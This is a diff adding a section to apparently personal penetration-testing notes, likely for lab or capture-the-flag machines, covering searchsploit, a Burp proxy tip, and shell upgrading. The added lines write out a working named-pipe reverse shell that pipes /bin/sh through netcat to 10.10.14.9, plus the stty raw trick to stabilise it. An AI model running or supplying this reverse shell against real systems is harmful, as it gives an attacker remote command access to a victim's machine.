@@ -33,3 +33,13 @@ searchsploit -p copies to clipboard
 
 use burp proxy backwards
 - add new proxy listener. then put localhost to a port for the ip you want to inspect. now when you connect to it with the web browser on port 80 you will intercept everything
+
+### getting an actual terminal
+
+`victim$ mknod /tmp/backpipe p`
+
+`victim$ /bin/sh 0</tmp/backpipe | nc 10.10.14.9 445 1>/tmp/backpipe `
+
+to edit the file ^Z to background the shell.
+
+now `stty raw -echo` then `fg` the shell then `reset` (you wont see anything text)
